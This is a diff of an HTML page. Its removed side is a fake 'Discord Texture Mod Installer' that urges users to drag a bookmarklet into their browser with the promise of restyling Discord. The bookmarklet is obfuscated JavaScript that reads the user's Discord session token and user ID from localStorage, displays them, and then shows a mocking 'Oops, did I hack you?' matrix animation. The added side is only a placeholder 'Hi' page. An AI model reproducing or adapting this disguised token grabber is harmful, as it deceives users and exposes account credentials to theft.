@@ -1,109 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Discord Texture Mod Installer</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>It Works</title>
+
+  <!-- iOS Web App Config -->
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-title" content="It Works" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="default" />
+  <link rel="apple-touch-icon" href="icon.png" />
+
   <style>
-    /* Discord dark theme colors */
-    :root {
-      --background: #2F3136;
-      --sidebar:     #202225;
-      --text:        #FFFFFF;
-      --accent:      #7289DA;
-      --muted:       #B9BBBE;
-    }
     body {
       margin: 0;
-      font-family: "Helvetica Neue", Arial, sans-serif;
-      background-color: var(--background);
-      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
-      padding: 2rem;
+      height: 100vh;
+      background: #f9f9f9;
     }
-    header {
-      width: 100%;
-      background-color: var(--sidebar);
-      padding: 1rem 2rem;
-      box-shadow: 0 1px 0 rgba(0,0,0,0.2);
-      margin-bottom: 2rem;
-    }
-    header h1 {
-      margin: 0;
-      font-size: 1.5rem;
-      color: var(--accent);
-    }
-    .instructions {
-      max-width: 600px;
-      line-height: 1.5;
-      margin-bottom: 2rem;
-    }
-    .instructions code {
-      background-color: #202225;
-      color: var(--text);
-      padding: 2px 4px;
-      border-radius: 3px;
-      font-size: 0.95em;
-    }
-    .bookmarklet {
-      display: inline-block;
-      background-color: var(--accent);
-      color: #FFF;
-      padding: 0.75rem 1.5rem;
-      border-radius: 4px;
-      text-decoration: none;
-      font-weight: bold;
-      font-family: monospace;
-      cursor: grab;
-      user-select: none;
-    }
-    .bookmarklet:active {
-      cursor: grabbing;
-    }
-    footer {
-      margin-top: auto;
-      font-size: 0.85rem;
-      color: var(--muted);
+    h1 {
+      font-size: 3rem;
+      color: #333;
     }
   </style>
 </head>
 <body>
-
-  <header>
-    <h1>Discord Texture Mod Installer</h1>
-  </header>
-
-  <div class="instructions">
-    <p>Follow these steps to install the <strong>Hacky Matrix</strong> bookmarklet:</p>
-    <ol>
-      <li>Press <code>Ctrl + Shift + B</code> (Windows/Linux) or <code>⌘ + Shift + B</code> (Mac) to show your browser’s bookmarks bar.</li>
-      <li>Drag the purple button below up into your bookmarks bar.</li>
-      <li>That’s it! Whenever you click the bookmark, it will completely change the style of discord.</li>
-    </ol>
-  </div>
-
-<a id="bookmarklet" draggable="true" style="cursor:grab">
-  📌 Drag me to your bookmarks bar!
-</a>
-
-  <script>
-(function(){
-  // 1) your bookmarklet code as a string:
-  var code = "javascript:function a0_0x36e2(_0x3b84a1,_0x367cf4){var _0x40d600=a0_0x40d6();return a0_0x36e2=function(_0x36e2f6,_0x361dbf){_0x36e2f6=_0x36e2f6-0x88;var _0x24d144=_0x40d600[_0x36e2f6];return _0x24d144;},a0_0x36e2(_0x3b84a1,_0x367cf4);}function a0_0x40d6(){var _0x26f1e8=['floor','6zcuTSJ','664945QdLAkP','px\x20monospace','hidden','907410cjTirX','Field\u00a01:','addEventListener','canvas','#00FF00','height','innerHTML','Oops,\x20did\x20I\x20hack\x20you?','fillStyle','div','black','100%','nowrap','994690kKrKbz','getContext','18px','50%','createElement','9XlPcnG','resize','rgba(0,0,0,0.8)','assign','appendChild','random','431562xgyoQz','user_id_cache','11Qzckbg','contentWindow','4qIZxvp','20px\x2030px','localStorage','body','fillRect','font','456573FYWLug','rgba(0,0,0,0.05)','107996BctYKy','style','6531288UBlheA','textContent'];a0_0x40d6=function(){return _0x26f1e8;};return a0_0x40d6();}(function(_0x47257d,_0x378c45){var _0x1035ec=a0_0x36e2,_0x3127cb=_0x47257d();while(!![]){try{var _0x2e61ca=-parseInt(_0x1035ec(0x90))/0x1+-parseInt(_0x1035ec(0x92))/0x2+-parseInt(_0x1035ec(0xb3))/0x3+parseInt(_0x1035ec(0x8a))/0x4*(parseInt(_0x1035ec(0x98))/0x5)+-parseInt(_0x1035ec(0x97))/0x6*(-parseInt(_0x1035ec(0x9b))/0x7)+-parseInt(_0x1035ec(0x94))/0x8*(-parseInt(_0x1035ec(0xad))/0x9)+parseInt(_0x1035ec(0xa8))/0xa*(parseInt(_0x1035ec(0x88))/0xb);if(_0x2e61ca===_0x378c45)break;else _0x3127cb['push'](_0x3127cb['shift']());}catch(_0x46287e){_0x3127cb['push'](_0x3127cb['shift']());}}}(a0_0x40d6,0x7ff2a),(function(){var _0x259f49=a0_0x36e2,_0x759198=document[_0x259f49(0xac)]('iframe');document[_0x259f49(0x8d)][_0x259f49(0xb1)](_0x759198);var _0x54edd8=_0x759198[_0x259f49(0x89)][_0x259f49(0x8c)]['token'],_0x4cf88a=_0x759198[_0x259f49(0x89)][_0x259f49(0x8c)][_0x259f49(0xb4)];alert(_0x259f49(0x9c)+_0x54edd8+'\x0aField\u00a02:'+_0x4cf88a),document[_0x259f49(0x8d)][_0x259f49(0xa1)]='',Object['assign'](document[_0x259f49(0x8d)]['style'],{'margin':'0','overflow':_0x259f49(0x9a),'background':_0x259f49(0xa5)});var _0x541000=document[_0x259f49(0xac)](_0x259f49(0x9e));document[_0x259f49(0x8d)][_0x259f49(0xb1)](_0x541000),Object[_0x259f49(0xb0)](_0x541000['style'],{'position':'fixed','top':'0','left':'0','width':_0x259f49(0xa6),'height':_0x259f49(0xa6),'zIndex':'0'});var _0x492127=_0x541000[_0x259f49(0xa9)]('2d'),_0x324e4b=0x10,_0x4d75e7,_0x54b9a7,_0xc92832=['0','1'];function _0x1dc924(){var _0x290ff0=_0x259f49;_0x541000['width']=innerWidth,_0x541000[_0x290ff0(0xa0)]=innerHeight,_0x4d75e7=Math[_0x290ff0(0x96)](_0x541000['width']/_0x324e4b),_0x54b9a7=Array(_0x4d75e7)['fill'](0x0)['map'](()=>Math[_0x290ff0(0xb2)]()*_0x541000[_0x290ff0(0xa0)]/_0x324e4b);}window[_0x259f49(0x9d)](_0x259f49(0xae),_0x1dc924),_0x1dc924(),setInterval(function(){var _0x39e76f=_0x259f49;_0x492127[_0x39e76f(0xa3)]=_0x39e76f(0x91),_0x492127[_0x39e76f(0x8e)](0x0,0x0,_0x541000['width'],_0x541000[_0x39e76f(0xa0)]),_0x492127[_0x39e76f(0xa3)]=_0x39e76f(0x9f),_0x492127[_0x39e76f(0x8f)]=_0x324e4b+_0x39e76f(0x99),_0x54b9a7['forEach'](function(_0x4dbd02,_0x20ef02){var _0x8ae4d3=_0x39e76f,_0x3493ca=_0xc92832[Math['floor'](Math[_0x8ae4d3(0xb2)]()*0x2)],_0x35c0ae=_0x20ef02*_0x324e4b,_0x2e9571=_0x4dbd02*_0x324e4b;_0x492127['fillText'](_0x3493ca,_0x35c0ae,_0x2e9571);if(_0x2e9571>_0x541000['height']&&Math['random']()>0.975)_0x54b9a7[_0x20ef02]=0x0;_0x54b9a7[_0x20ef02]++;});},0x32);var _0x3c3512=document['createElement'](_0x259f49(0xa4));_0x3c3512[_0x259f49(0x95)]=_0x259f49(0xa2),Object['assign'](_0x3c3512[_0x259f49(0x93)],{'position':'absolute','top':_0x259f49(0xab),'left':_0x259f49(0xab),'transform':'translate(-50%,-50%)','background':_0x259f49(0xaf),'border':'2px\x20solid\x20#00FF00','color':_0x259f49(0x9f),'fontFamily':'monospace','fontSize':_0x259f49(0xaa),'padding':_0x259f49(0x8b),'zIndex':'1','whiteSpace':_0x259f49(0xa7)}),document[_0x259f49(0x8d)]['appendChild'](_0x3c3512);}()));";
-
-  // 2) grab the link
-  var a = document.getElementById('bookmarklet');
-
-  // 3) ensure it has no href to click
-  a.removeAttribute('href');
-
-  // 4) when the user drags it, put the code into the dataTransfer
-  a.addEventListener('dragstart', function(e){
-    e.dataTransfer.setData('text/uri-list', code);
-    e.dataTransfer.setData('text/plain', code);
-  });
-})();
-</script>
+  <h1>Hi</h1>
 </body>
 </html>
